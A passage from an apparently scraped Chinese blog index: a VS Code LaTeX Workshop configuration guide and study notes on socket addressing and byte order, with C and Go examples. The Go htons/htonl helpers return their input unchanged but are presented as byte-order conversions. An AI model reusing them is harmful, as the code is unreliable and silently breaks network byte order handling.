其他api不是需要自己部署就是收费，就不捣鼓了。\n","date":"2023-11-18T17:09:33+08:00","permalink":"https://anonymity-0.github.io/posts/gpt-academic%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE/","title":"Gpt Academic本地配置"},{"content":"最近开始要写课程论文了，想着要用latex的模板直接写会方便，又懒得下overleaf，话不多说开始配置\n下载与安装 可以从该镜像下载 [Index of CTAN-local/systems/texlive/Images](https://mirrors.huaweicloud.com/CTAN/systems/texlive/Images/\nmac用户可配置MacTeX - TeX Users Group\n安装vscode插件 LaTeX Workshop\n配置 配置latex-workshop 不包含外部 pdf 查看器设置的配置\n1 \u0026#34;latex-workshop.latex.autoBuild.run\u0026#34;: \u0026#34;never\u0026#34;, 2 \u0026#34;latex-workshop.showContextMenu\u0026#34;: true, 3 \u0026#34;latex-workshop.intellisense.package.enabled\u0026#34;: true, 4 \u0026#34;latex-workshop.message.error.show\u0026#34;: false, 5 \u0026#34;latex-workshop.message.warning.show\u0026#34;: false, 6 \u0026#34;latex-workshop.latex.tools\u0026#34;: [ 7 { 8 \u0026#34;name\u0026#34;: \u0026#34;xelatex\u0026#34;, 9 \u0026#34;command\u0026#34;: \u0026#34;xelatex\u0026#34;, 10 \u0026#34;args\u0026#34;: [ 11 \u0026#34;-synctex=1\u0026#34;, 12 \u0026#34;-interaction=nonstopmode\u0026#34;, 13 \u0026#34;-file-line-error\u0026#34;, 14 \u0026#34;%DOCFILE%\u0026#34; 15 ] 16 }, 17 { 18 \u0026#34;name\u0026#34;: \u0026#34;pdflatex\u0026#34;, 19 \u0026#34;command\u0026#34;: \u0026#34;pdflatex\u0026#34;, 20 \u0026#34;args\u0026#34;: [ 21 \u0026#34;-synctex=1\u0026#34;, 22 \u0026#34;-interaction=nonstopmode\u0026#34;, 23 \u0026#34;-file-line-error\u0026#34;, 24 \u0026#34;%DOCFILE%\u0026#34; 25 ] 26 }, 27 { 28 \u0026#34;name\u0026#34;: \u0026#34;latexmk\u0026#34;, 29 \u0026#34;command\u0026#34;: \u0026#34;latexmk\u0026#34;, 30 \u0026#34;args\u0026#34;: [ 31 \u0026#34;-synctex=1\u0026#34;, 32 \u0026#34;-interaction=nonstopmode\u0026#34;, 33 \u0026#34;-file-line-error\u0026#34;, 34 \u0026#34;-pdf\u0026#34;, 35 \u0026#34;-outdir=%OUTDIR%\u0026#34;, 36 \u0026#34;%DOCFILE%\u0026#34; 37 ] 38 }, 39 { 40 \u0026#34;name\u0026#34;: \u0026#34;bibtex\u0026#34;, 41 \u0026#34;command\u0026#34;: \u0026#34;bibtex\u0026#34;, 42 \u0026#34;args\u0026#34;: [ 43 \u0026#34;%DOCFILE%\u0026#34; 44 ] 45 } 46 ], 47 \u0026#34;latex-workshop.latex.recipes\u0026#34;: [ 48 { 49 \u0026#34;name\u0026#34;: \u0026#34;XeLaTeX\u0026#34;, 50 \u0026#34;tools\u0026#34;: [ 51 \u0026#34;xelatex\u0026#34; 52 ] 53 }, 54 { 55 \u0026#34;name\u0026#34;: \u0026#34;PDFLaTeX\u0026#34;, 56 \u0026#34;tools\u0026#34;: [ 57 \u0026#34;pdflatex\u0026#34; 58 ] 59 }, 60 { 61 \u0026#34;name\u0026#34;: \u0026#34;BibTeX\u0026#34;, 62 \u0026#34;tools\u0026#34;: [ 63 \u0026#34;bibtex\u0026#34; 64 ] 65 }, 66 { 67 \u0026#34;name\u0026#34;: \u0026#34;LaTeXmk\u0026#34;, 68 \u0026#34;tools\u0026#34;: [ 69 \u0026#34;latexmk\u0026#34; 70 ] 71 }, 72 { 73 \u0026#34;name\u0026#34;: \u0026#34;xelatex -\u0026gt; bibtex -\u0026gt; xelatex*2\u0026#34;, 74 \u0026#34;tools\u0026#34;: [ 75 \u0026#34;xelatex\u0026#34;, 76 \u0026#34;bibtex\u0026#34;, 77 \u0026#34;xelatex\u0026#34;, 78 \u0026#34;xelatex\u0026#34; 79 ] 80 }, 81 { 82 \u0026#34;name\u0026#34;: \u0026#34;pdflatex -\u0026gt; bibtex -\u0026gt; pdflatex*2\u0026#34;, 83 \u0026#34;tools\u0026#34;: [ 84 \u0026#34;pdflatex\u0026#34;, 85 \u0026#34;bibtex\u0026#34;, 86 \u0026#34;pdflatex\u0026#34;, 87 \u0026#34;pdflatex\u0026#34; 88 ] 89 }, 90 ], 91 \u0026#34;latex-workshop.latex.clean.fileTypes\u0026#34;: [ 92 \u0026#34;*.aux\u0026#34;, 93 \u0026#34;*.bbl\u0026#34;, 94 \u0026#34;*.blg\u0026#34;, 95 \u0026#34;*.idx\u0026#34;, 96 \u0026#34;*.ind\u0026#34;, 97 \u0026#34;*.lof\u0026#34;, 98 \u0026#34;*.lot\u0026#34;, 99 \u0026#34;*.out\u0026#34;, 100 \u0026#34;*.toc\u0026#34;, 101 \u0026#34;*.acn\u0026#34;, 102 \u0026#34;*.acr\u0026#34;, 103 \u0026#34;*.alg\u0026#34;, 104 \u0026#34;*.glg\u0026#34;, 105 \u0026#34;*.glo\u0026#34;, 106 \u0026#34;*.gls\u0026#34;, 107 \u0026#34;*.ist\u0026#34;, 108 \u0026#34;*.fls\u0026#34;, 109 \u0026#34;*.log\u0026#34;, 110 \u0026#34;*.fdb_latexmk\u0026#34; 111 ], 112 \u0026#34;latex-workshop.latex.autoClean.run\u0026#34;: \u0026#34;onFailed\u0026#34;, 113 \u0026#34;latex-workshop.latex.recipe.default\u0026#34;: \u0026#34;lastUsed\u0026#34;, 114 \u0026#34;latex-workshop.view.pdf.internal.synctex.keybinding\u0026#34;: \u0026#34;double-click\u0026#34; SumatraPDF 安装设置 因为vscode内置的pdf查看器不太好用，可以配置别的pdf查看器。具体配置参考Visual Studio Code (vscode)配置LaTeX - 知乎\n常用latex模板 科大学位论文模板：GitHub - ustctug/ustcthesis: LaTeX template for USTC thesis 国科大学位论文模板：GitHub - mohuangrui/ucasthesis: LaTeX Thesis Template for the University of Chinese Academy of Sciences 国科大大作业论文模板：GitHub - jweihe/UCAS_Latex_Template: 中国科学院大学通用课程大作业模板 ","date":"2023-11-15T21:32:47+08:00","permalink":"https://anonymity-0.github.io/posts/vscode%E9%85%8D%E7%BD%AElatex/","title":"VScode配置Latex"},{"content":"3.1 分配给套接字的IP地址与端口号 网络地址 略\n用于区分套接字的端口号 IP用于区分计算机,只要有IP地址就能向目标主机传输数据,但仅凭这些无法传输给最终的应用程序。假设各位欣赏视频的同时在网上冲浪,这时至少需要1个接收视频数据的套接字和1 个接收网页信息的套接字。问题在于如何区分二者。简言之,传输到计算机的网络数据是发给播放器,还是发送给浏览器?\n若想接收多台计算机发来的数据,则需要相应个数的套接字。那如何区分这些套接字呢? 计算机中一般配有NIC(Network Interface Card,网络接口卡)数据传输设备。通过NIC向计算机内部传输数据时会用到IP。操作系统负责把传递到内部的数据适当分配给套接字,利用端口号。也就是说,通过NIC接收的数据内有端口号,操作系统正是参考此端口号把数据传输给相应端口的套接字 端口号就是在同一操作系统内为区分不同套接字而设置的,因此无法将1个端口号分配给不同套接字。 另外,端口号由16位构成 可分配的端口号范围是0-65535。但0-1023是知名端口(Well-known PORT),一般分配给特定应用程序,所以应当分配此范围之外的值。另外,虽然端口号不能重复,但TCP套接字和UDP套接字不会共用端口号,所以允许重复。例如:如果某TCP 套接字使用9190号端口,则其他TCP套接字就无法使用该端口号,但UDP套接字可以使用。 总之,数据传输目标地址同时包含IP地址和端口号,只有这样,数据才会被传输到最终的目的应用程序(应用程序套接字)。\n3.2 应用程序中使用的IP地址和端口号以结构体的形式给出了定义。本节将以IPv4为中心,围绕此结构体讨论目标地址的表示方法。\n表示IPv4的结构体 填写地址信息时应以如下提问为线索进行\n口 问题1：“采用哪一种地址族？” 口 答案1：“基于IPv4的地址族。” 口问题2：“IP地址是多少？” 口答案2：“211.204.214.76。” 口 问题3：“端口号是多少？” 口 答案3：“2048。” C C语言中IPv4结构体定义为如下形态\n1struct sockaddr_in 2{ 3\tsa_family_t sin_family; //地址族 4\tuint16_t sin_port; //16位TCP/UDP地址 5\tstruct in_addr sin_addr; //32位ip地址 6\tchar sin_zero[8]; //不使用 7}; in_addr定义如下，它用来存放32位IP地址\n1struct in_addr 2{ 3\tIn_addr_t s_addr; //32位IPv4地址 4} 可以看到 in_addr_t 实际上是 uint32_t也就是无符号32位bit，那为什么需要额外定义这些数据类型呢? 如前所述,这是考虑到扩展性的结果。如果使用int32_t类型的数据,就能保证在任何时候都占用4字节,即使将来用64位表示int类型也是如此。 从之前介绍的代码也可看出,sockaddr_in结构体变量地址值将以如下方式传递给bind函数。\n1struct sockaddr_in serv_addr; 2... 3if(bind(serv_sock,(struct sockaddr * ) \u0026amp;serv_addr, sizeof(Serv_addr))== -1) 4\terror_handling(\u0026#34;bind()error\u0026#34;); 5... 此处重要的是第二个参数的传递。实际上,bind函数的第二个参数期望得到sockaddr结构体变量地址值,包括地址族、端口号、IP地址等。（此处进行了强制类型转换,将sockaddr_in转成sockaddr）从下列代码也可看出,直接向sockaddr结构体填充这些信息会带来麻烦。\n1struct sockaddr { 2 sa_family_t char sin_family;//地址族(Address Family) 3 sa_data[14];// 地址信息 4} 此结构体成员sa_data保存的地址信息中需包含IP地址和端口号,剩余部分应填充0,这也是bind函数要求的。而这对于包含地址信息来讲非常麻烦,继而就有了新的结构体sockaddr_in。若按照之前的讲解填写sockaddr_in结构体,则将生成符合bind函数要求的字节流。最后转换为sockaddr型的结构体变量,再传递给bind函数即可。\nsin_family 每种协议族适用的地址族均不同。比如,IPv4使用4字节地址族,IPv6使用16字节地址族。 可以参考表3-2保存sin_family地址信息。 sockaddr_in是保存IPv4地址信息的结构体。那为何还需要通过sin_family单独指定地址族信息呢? 这与之前讲过的sockaddr结构体有关。结构体sockaddr并非只次IPv4设计, 这从保存地址信息的数组sa_data长度为14字节也可看出。因此,结构体sockaddr要求在sin_family 中指定地址族信息。为了与sockaddr保持一致,sockaddr_in结构体中也有地址族信息。\nsin_port 该成员保存16位端口号,重点在于,它以网络字节序保存\nsin_addr 该成员保存32位IP地址信息,且也以网络字节序保存。为理解好该成员,应同时观察结构体in_addr。但结构体in_addr声明为uint32_t,因此只需当作32位整数型即可。\nsin_zero 无特殊含义。只是 使结构体sockaddr_in的大小与sockadd结构体保持一致而插入的成员。 必需填充为0,否则无法得到想要的结果。\ngo 在 Go 语言中，类似于 C 语言中 struct sockaddr_in 的结构体是 syscall.SockaddrInet4（对于 IPv4）和 syscall.SockaddrInet6（对于 IPv6）。\n在go中，就没有特别定义in_addr_t，直接使用[4]byte。\n1// SockaddrInet4 结构体用于表示一个 IPv4 网络地址。 2type SockaddrInet4 struct { 3 Port int // Port 字段表示端口号 4 Addr [4]byte // Addr 字段表示 IPv4 地址，存储为 4 字节 5 raw RawSockaddrInet4 // raw 字段是内部使用的原始结构体，用于与系统调用交互 6} Port：一个 int 类型的值，表示网络地址的端口号。\nAddr：一个 [4]byte 类型的数组，表示 IPv4 地址。每个字节代表地址的一部分，例如，地址 \u0026ldquo;127.0.0.1\u0026rdquo; 会被表示为 [127, 0, 0, 1]。\nraw：一个 RawSockaddrInet4 类型的值，表示网络地址的底层表示。这个字段通常由系统调用使用，不应在常规 Go 代码中直接使用\nRawSockaddrInet4\n1// RawSockaddrInet4 结构体用于表示一个 IPv4 网络地址的底层结构。 2type RawSockaddrInet4 struct { 3 Len uint8 // Len 字段表示此结构体的长度 4 Family uint8 // Family 字段表示地址族，对于 IPv4，此值通常为 AF_INET 5 Port uint16 // Port 字段表示端口号 6 Addr [4]byte // Addr 字段表示 IPv4 地址，存储为 4 字节 7 Zero [8]int8 // Zero 字段是填充字段，用于确保结构体的大小正确 8} Go语言也类似，这是go 的bind函数\n1func Bind(fd int, sa Sockaddr) (err error) { 2\tptr, n, err := sa.sockaddr() 3\tif err != nil { 4\treturn err 5\t} 6\treturn bind(fd, ptr, n) 7} 在 Go 语言中，syscall.Bind 函数的第二个参数是 Sockaddr 类型，这是一个接口类型，它定义了一些方法，这些方法需要由任何实现该接口的类型来实现。\nSockaddrInet4 和 SockaddrInet6 结构体都实现了 Sockaddr 接口，因此它们可以作为 syscall.Bind 函数的参数。\n当你创建一个 SockaddrInet4 结构体并传递给 syscall.Bind 函数时，Go 语言会自动将 SockaddrInet4 结构体转换为 Sockaddr 接口类型，然后再传递给 syscall.Bind 函数。\n所以，虽然 syscall.Bind 函数的参数类型是 Sockaddr，但你可以传递一个 *SockaddrInet4 或 *SockaddrInet6 结构体给它。\nLen：一个 uint8 类型的值，表示此结构体的长度。\nFamily：一个 uint8 类型的值，表示地址族。对于 IPv4，此值通常为 AF_INET。\nFamily 字段在 RawSockaddrInet4 结构体中用于指定地址族。对于 IPv4 地址，这个字段通常被设置为 AF_INET。 虽然 RawSockaddrInet4 结构体通常用于表示 IPv4 地址，但 Family 字段仍然是必要的，因为它告诉操作系统如何解释这个结构体中的其他字段。例如，Port 和 Addr 字段的解释方式取决于 Family 字段的值。 此外，Family 字段也可以帮助调试和错误检查。例如，如果你看到一个 Family 字段的值不是 AF_INET，但结构体是 RawSockaddrInet4，那么你就知道有些地方出错了。\nPort：一个 uint16 类型的值，表示网络地址的端口号。注意，这个值是网络字节序。\nAddr：一个 [4]byte 类型的数组，表示 IPv4 地址。每个字节代表地址的一部分，例如，地址 \u0026ldquo;127.0.0.1\u0026rdquo; 会被表示为 [127, 0, 0, 1]。\nZero：一个 [8]int8 类型的数组，用于填充，以确保结构体的大小正确。这个字段通常不用于常规编程。（类似sin_zero）\nSockaddrInet4 和 RawSockaddrInet4 两个结构体都包含 Port 和 Addr 字段，但它们的用途是不同的。\nSockaddrInet4 是 Go 语言对网络地址的高级表示，它的 Port 和 Addr 字段类型分别为 int 和 [4]byte，这对于 Go 程序员来说更易于使用。\n而 RawSockaddrInet4 是对系统调用级别的网络地址的低级表示，它的 Port 和 Addr 字段类型分别为 uint16 和 [4]byte，并且 Port 字段是网络字节序，这对于系统调用来说是必须的。\n当你在 Go 代码中创建一个 SockaddrInet4 结构体并传递给如 syscall.Bind 这样的函数时，Go 语言会自动将 SockaddrInet4 结构体转换为 RawSockaddrInet4 结构体，然后再传递给底层的系统调用。这就是为什么 SockaddrInet4 结构体中包含一个 RawSockaddrInet4 字段的原因。\nSockaddrInet4结构体包含了IPv4地址和端口信息，而RawSockaddrInet4结构体则是为了在底层网络编程中使用原始的套接字地址结构而定义的。这种设计可以让网络编程在不同层次上进行操作，同时保持灵活性和可扩展性。\n3.3 网络字节序与地址变换 不同CPU中,4字节整数型值1在内存空间的保存方式是不同的。4字节整数型值1可用2进制表示如下。 00000000 00000000 00000000 00000001 有些CPU以这种顺序保存到内存,另外一些CPU则以倒序保存。 00000001 00000000 00000000 00000000 若不考虑这些就收发数据则会发生问题,因为保存顺序的不同意味着对接收数据的解析顺序也不同。\n字节序与网络字节序 CPU向内存保存数据的方式有2种,这意味着CPU解析数据的方式也分为2种。\n大端序(Big Endian):高位字节存放到低位地址。 小端序(Little Endian):高位字节存放到高位地址。 每种CPU的数据保存方式均不同。因此, 代表CPU数据保存方式的主机字节序(Host Byte Order)在不同CPU中也各不相同。目前主流的Intel系列CPU以小端序方式保存数据。接下来分析2台字节序不同的计算机之间数据传递过程中可能出现的问题 0x12和0x34构成的大端序系统值与0x34和0x12构成的小端序系统值相同。换言之,只有改变数据保存顺序才能被识别为同一值。图3-6中,大端序系统传输数据0x1234时未考虑字节序问题, 而直接以Ox12、0x34的顺序发送。结果接收端以小端序方式保存数据,因此小端序接收的数据变成0x3412,而非0x1234。正因如此,在通过网络传输数据时约定统一方式,这种约定称为网络字节序(Network Byte Order) 非常简单：统一为大端序。 即,先把数据数组转化成大端序格式再进行网络传输。因此,所有计算机接收数据时应识别该数据是网络字节序格式,小端序系统传输数据时应转化为大端序排列方式。 字节序转换 接下来介绍帮助转换字节序的函数。这是文中给的c语言转换函数 在 Go 语言中，没有内置的 htons（Host TO Network Short）、ntohs（Network TO Host Short）、htonl（Host TO Network Long）和 ntohl（Network TO Host Long）函数。这些函数在 C 语言中用于在主机字节序和网络字节序之间转换数据。\n但是，你可以使用 Go 语言的 encoding/binary 包来实现同样的功能。以下是如何在 Go 语言中实现这些函数的例子：\n1package main 2 3import ( 4 \u0026#34;encoding/binary\u0026#34; 5 \u0026#34;fmt\u0026#34; 6) 7 8func htons(n uint16) uint16 { 9 var b [2]byte 10 binary.BigEndian.PutUint16(b[:], n) 11 return binary.BigEndian.Uint16(b[:]) 12} 13 14func ntohs(n uint16) uint16 { 15 return htons(n) // 在 16 位无符号整数上，ntohs 和 htons 是相同的 16} 17 18func htonl(n uint32) uint32 { 19 var b [4]byte 20 binary.BigEndian.PutUint32(b[:], n) 21 return binary.BigEndian.Uint32(b[:]) 22} 23 24func ntohl(n uint32) uint32 { 25 return htonl(n) // 在 32 位无符号整数上，ntohl 和 htonl 是相同的 26} 27 28func main() { 29 fmt.Println(htons(12345)) // 输出：12345 30 fmt.Println(ntohs(12345)) // 输出：12345 31 fmt.Println(htonl(12345)) // 输出：12345 32 fmt.Println(ntohl(12345)) // 输出：12345 33} endian_conv.go\n1package main 2 3import ( 4 \u0026#34;encoding/binary\u0026#34; 5 \u0026#34;fmt\u0026#34; 6) 7 8// htons 函数接收一个 uint16 类型的主机字节序值， 9// 将其转换为网络字节序，然后返回转换后的值。 10func htons(n uint16) uint16 { 11 b := make([]byte, 2) // 创建一个长度为 2 的字节数组 12 binary.BigEndian.PutUint16(b, n) // 将 n 的值以大端字节序放入字节数组 13 return binary.BigEndian.Uint16(b) // 从字节数组中读取并返回大端字节序的值 14} 15 16// htonl 函数接收一个 uint32 类型的主机字节序值， 17// 将其转换为网络字节序，然后返回转换后的值。 18func htonl(n uint32) uint32 { 19 b := make([]byte, 4) // 创建一个长度为 4 的字节数组 20 binary.BigEndian.PutUint32(b, n) // 将 n 的值以大端字节序放入字节数组 21 return binary.BigEndian.Uint32(b) // 从字节数组中读取并返回大端字节序的值 22} 23 24func main() { 25 hostPort := uint16(0x1234) // 定义一个主机字节序的端口值 26 hostAddr := uint32(0x12345678) // 定义一个主机字节序的地址值 27 28 netPort := htons(hostPort) // 将主机字节序的端口值转换为网络字节序 29 netAddr := htonl(hostAddr) // 将主机字节序的地址值转换为网络字节序 3.4 网络地址的初始化与分配 将字符串信息转换为网络字节序的整数型 sockaddr_in中保存地址信息的成员为32位整数型。因此,为了分配IP地址,需要将其表示为32位整数型数据。这对于只熟悉字符串信息的我们来说实非易事。\n对于IP地址的表示,我们熟悉的是点分十进制表示法(Dotted Decimal Notation),而非整数型数据表示法。幸运的是,有个函数会帮我们将字符串形式的IP地址转换成32位整数型数据。此函数在转换类型的同时进行网络字节序转换。\ninet_addr 1#include \u0026lt;arpa/inet.h\u0026gt; 2in_addr_t inet_addr(const char * string); 3\t//成功时返回32位大端序整数型值,失败时返回 INADDR_NONE。 如果向该函数传递类似“211.214.107.99”的点分十进制格式的字符串,它会将其转换为32 位整数型数据并返回。当然,该整数型值满足网络字节序。另外,该函数的返回值类型in_addr_t 在内部声明为32位整数型。\n在 Go 中，你可以使用 net 包的 ParseIP 函数来解析 IP 地址。这个函数可以处理 IPv4 和 IPv6 地址，如果输入的字符串不是有效的 IP 地址，它会返回 nil。然后，你可以使用 encoding/binary 包的 BigEndian.Uint32 或 LittleEndian.Uint32 函数将 net.IP 类型的 IP 地址转换为网络字节序或主机字节序的整数。\n1package main 2 3import ( 4 \u0026#34;encoding/binary\u0026#34; 5 \u0026#34;fmt\u0026#34; 6 \u0026#34;net\u0026#34; 7) 8 9func main() { 10 ip := net.ParseIP(\u0026#34;1.2.3.4\u0026#34;) 11 if ip == nil { 12 fmt.Println(\u0026#34;Invalid IP address\u0026#34;) 13 return 14 } 15 ip = ip.To4() 16 if ip == nil { 17 fmt.Println(\u0026#34;Not an IPv4 address\u0026#34;) 18 return 19 } 20 fmt.Printf(\u0026#34;IP as integer (network byte order): %x\\n\u0026#34;, binary.BigEndian.Uint32(ip)) 21 fmt.Printf(\u0026#34;IP as integer (host byte order): %x\\n\u0026#34;, binary.LittleEndian.Uint32(ip)) 22} inter_addr.go\n1package main 2 3import ( 4\t\u0026#34;encoding/binary\u0026#34; 5\t\u0026#34;fmt\u0026#34; 6\t\u0026#34;net\u0026#34; 7) 8 9const INADDR_NONE = 0xffffffff 10 11// inet_addr converts an IPv4 address in dot-decimal notation into a 32-bit integer in network byte order. 12// If the IP address is invalid, it returns INADDR_NONE (0xffffffff). 13func inet_addr(ipStr string) uint32 { 14\tip := net.ParseIP(ipStr) 15\tif ip == nil { 16\treturn 0xffffffff 17\t} 18\tip = ip.To4() 19\tif ip == nil { 20\treturn 0xffffffff 21\t} 22\treturn binary.BigEndian.Uint32(ip) 23 24} 25func main() { 26\taddr1 := \u0026#34;1.2.3.4\u0026#34; 27\taddr2 := \u0026#34;1.2.3.256\u0026#34; 28 29\tconv_addr := inet_addr(addr1) 30 31\tif conv_addr == INADDR_NONE { 32\tfmt.Println(\u0026#34;Error occured!\u0026#34;) 33\t} else { 34\tfmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, conv_addr) 35\t} 36\tconv_addr = inet_addr(addr2) 37\tif conv_addr == INADDR_NONE { 38\tfmt.Println(\u0026#34;Error occured!\u0026#34;) 39\t} else { 40\tfmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, conv_addr) 41\t} 42} inet_aton inet_aton函数 与inet_addr函数在功能上完全相同,也将字符串形式IP地址转换为32位网络字节序整数并返回。只不过该函数利用了in_addr结构体,且其使用频率更高。\n1#include \u0026lt;arpa/inet.h\u0026gt; 2int inet_aton(const char * string,struct in_addn * addn); 3//成功时返回1(true),失败时返回 0(false)。 4//string 含有需转换的IP地址信息的字符串地址值。 5//addr 将保存转换结果的in_addr结构体变量的地址值。 inet_aton.go\n1package main 2 3import ( 4 \u0026#34;encoding/binary\u0026#34; 5 \u0026#34;fmt\u0026#34; 6 \u0026#34;log\u0026#34; 7 \u0026#34;net\u0026#34; 8) 9 10// inet_aton converts an IPv4 address in dot-decimal notation into a 32-bit integer in network byte order. 11// If the IP address is valid, it stores the result in the given *uint32 and returns true. 12// If the IP address is invalid, it returns false. 13func inet_aton(ipStr string, ip *uint32) bool { 14 parsedIP := net.ParseIP(ipStr) 15 if parsedIP == nil { 16 return false 17 } 18 parsedIP = parsedIP.To4() 19 if parsedIP == nil { 20 return false 21 } 22 *ip = binary.BigEndian.Uint32(parsedIP) 23 return true 24} 25 26func main() { 27 addr := \u0026#34;127.232.124.79\u0026#34; 28 var ip uint32 29 30 if !inet_aton(addr, \u0026amp;ip) { 31 log.Fatalln(\u0026#34;Conversion error\u0026#34;) 32 } else { 33 fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, ip) 34 } 35} inet_aton 上述运行结果无关紧要,更重要的是大家要熟练掌握该函数的调用方法。最后再介绍一个与inet_aton函数正好相反的函数,此函数可以把网络字节序整数型IP地址转换成我们熟悉的字符串形式。\n1#include \u0026lt;arpa/inet.h\u0026gt; 2char * inet_ntoa(struct in_addr adr); 3//成功时返回转换的字符串地址值,失败时返回-1。 该函数将通过参数传入的整数型IP地址转换为字符串格式并返回。 但调用时需小心,返回值类型为char指针。返回字符串地址意味着字符串已保存到内存空间,但该函数未向程序员要求分配内存,而是在内部申请了内存并保存了字符串。也就是说,调用完该函数后,应立即将字符串信息复制到其他内存空间。总之,再次调用inet_ntoa函数前返回的字符串地址值是有效的。若需要长期保存,则应将字符串复制到其他内存空间。\nGo语言标准库中并没有直接提供对C语言中的网络地址转换函数的封装。如果要在Go中实现类似的功能，可以使用net包中的IP和IPv4类来进行IP地址的转换和操作。以下是一个简单的示例代码：\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;net\u0026#34; 6) 7 8func main1() { 9\tvar addr1, addr2 uint32 = 0x1020304, 0x1010101 10 11\tip1 := net.IPv4(byte(addr1\u0026gt;\u0026gt;24), byte(addr1\u0026gt;\u0026gt;16), byte(addr1\u0026gt;\u0026gt;8), byte(addr1)) 12\tip2 := net.IPv4(byte(addr2\u0026gt;\u0026gt;24), byte(addr2\u0026gt;\u0026gt;16), byte(addr2\u0026gt;\u0026gt;8), byte(addr2)) 13 14\tfmt.Printf(\u0026#34;Dotted-Decimal notation1: %s \\n\u0026#34;, ip1.String()) 15\tfmt.Printf(\u0026#34;Dotted-Decimal notation2: %s \\n\u0026#34;, ip2.String()) 16} 用go自行写的 inet_aton函数\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;net\u0026#34; 6) 7 8// inet_ntoa converts a 32-bit integer in network byte order into a dotted-decimal IP address. 9func inet_ntoa(ipInt uint32) string { 10\tipBytes := make([]byte, 4) 11\tipBytes[0] = byte(ipInt \u0026gt;\u0026gt; 24) 12\tipBytes[1] = byte(ipInt \u0026gt;\u0026gt; 16) 13\tipBytes[2] = byte(ipInt \u0026gt;\u0026gt; 8) 14\tipBytes[3] = byte(ipInt) 15\treturn net.IP(ipBytes).String() 16} 17 18func main() { 19\tvar addr1, addr2 uint32 = 0x1020304, 0x1010101 20 21\tfmt.Printf(\u0026#34;Dotted-Decimal notation1: %s \\n\u0026#34;, inet_ntoa(addr1)) 22\tfmt.Printf(\u0026#34;Dotted-Decimal notation2: %s \\n\u0026#34;, inet_ntoa(addr2)) 23} 网络地址初始化 上述代码中,memset函数将每个字节初始化为同一值:第一个参数为结构体变量addr的地址值,即初始化对象为addr;第二个参数为0,因此初始化为0;最后一个参数中传入addr的长度,因此addr的所有字节均初始化为0。这么做是为了将sockaddr_in结构体的成员sin_zero初始化为0。 另外,最后一行代码调用的atoi函数把字符串类型的值转换成整数型。总之,上述代码利用字符串格式的IP地址和端口号初始化了sockaddr_in结构体变量。 另外,代码中对IP地址和端口号进行了硬编码,这并非良策,因为运行环境改变就得更改代码。因此,我们运行示例main函数时传入IP地址和端口号。\n客户端地址信息初始化 上述网络地址信息初始化过程主要针对服务器端而非客户端。给套接字分配IP地址和端口号主要是为下面这件事做准备:\n“请把进入IP 211.217.168.13、9190端口的数据传给我!” 反观客户端中连接请求如下:\n“请连接到IP 211.217.168.13、9190端口!” 请求方法不同意味着调用的函数也不同。服务器端的准备工作通过bind函数完成,而客户端则通过connect函数完成。因此,函数调用前需准备的地址值类型也不同。服务器端声明sockaddr_in 结构体变量,将其初始化为赋子服务器端IP和套接字的端口号,然后调用bind函数;而客户端则声明sockaddr_in结构体,并初始化为要与之连接的服务器端套接字的IP和端口号,然后调用connect函数。\nINADDR_ANY 与之前方式最大的区别在于,利用常数INADDR_ANY分配服务器端的IP地址。若采用这种方式,则可自动获取运行服务器端的计算机IP地址,不必亲自输人。而且,若同一计算机中已分配多个IP地址(多宿主(Multi-homed)计算机,一般路由器属于这一类),则只要端口号一致, 就可以从不同IP地址接收数据。因此,服务器端中优先考虑这种方式。而客户端中除非带有一部分服务器端功能,否则不会采用。\n初始化服务器端套接字时应分配所属计算机的IP地址,因为初始化时使用的IP地址非常明确,那为何还要进行IP初始化呢?如前所述,同一计算机中可以分配多个IP地址, 实际IP地址的个数与计算机中安装的NIC的数量相等。即使是服务器端套接字,也需要决定应接收哪个IP传来的(哪个NIC传来的)数据。因此,服务器端套接字初始化过程中要求IP地址信息。另外,若只有1个NIC,则直接使用INADDR_ANY。\n在 Go 中，你可以使用空字符串 \u0026quot;\u0026quot; 作为 IP 地址来代表 INADDR_ANY，这表示监听所有的 IP 地址。以下是一个简单的 TCP 服务器示例，它监听所有的 IP 地址和一个特定的端口：\n1package main 2 3import ( 4 \u0026#34;log\u0026#34; 5 \u0026#34;net\u0026#34; 6) 7 8func main() { 9 listener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:8080\u0026#34;) 10 if err != nil { 11 log.Fatal(err) 12 } 13 defer listener.Close() 14 15 for { 16 conn, err := listener.Accept() 17 if err != nil { 18 log.Fatal(err) 19 } 20 go handleConnection(conn) 21 } 22} 23 24func handleConnection(conn net.Conn) { 25 // Handle the connection 26 defer conn.Close() 27} 在这个示例中，net.Listen(\u0026quot;tcp\u0026quot;, \u0026quot;:8080\u0026quot;) 会监听所有的 IP 地址和端口 8080。当有新的连接到来时，listener.Accept() 会返回一个新的 net.Conn 对象，然后你可以在新的 goroutine 中处理这个连接。\n向套接字分配网络地址 既然已讨论了sockaddr_in结构体的初始化方法,接下来就把初始化的地址信息分配给套接字。bind函数负责这项操作。\n1#include \u0026lt;sys/socket.h\u0026gt; 2int bind(int sockfd, struct sockaddr * myaddr, socklen_t addrLen); 3//成功时返回0,失败时返回-1。 4//sockfd 要分配地址信息(IP地址和端口号)的套接字文件描述符。 5//myaddr 存有地址信息的结构体变量地址值。 6//addrlen 第二个结构体变量的长度。 在 Go 语言中，Bind 函数是 syscall 包中的一个函数，用于将本地协议地址 addr 绑定到文件描述符 fd。函数原型如下：\n1func Bind(fd int, sa Sockaddr) (err error) { 2\tptr, n, err := sa.sockaddr() 3\tif err != nil { 4\treturn err 5\t} 6\treturn bind(fd, ptr, n) 7} 其中，fd 是通过 Socket 函数获取的文件描述符，addr 是一个实现了 Sockaddr 接口的网络地址。\n两者的主要区别在于：\nGo 的 Bind 函数使用了接口 Sockaddr，这使得你可以传入任何实现了 Sockaddr 接口的类型，如 SockaddrInet4、SockaddrInet6、SockaddrUnix 等。而 C 的 bind 函数需要一个指向 struct sockaddr 的指针，需要手动进行类型转换。\nGo 的 Bind 函数返回一个错误值，你可以直接检查这个错误值来确定 Bind 函数是否成功。而 C 的 bind 函数返回一个整数，需要检查这个整数和 errno 来确定 bind 函数是否成功。\nGo 的 Bind 函数处理了一些底层的细节，如网络字节序的转换。而在 C 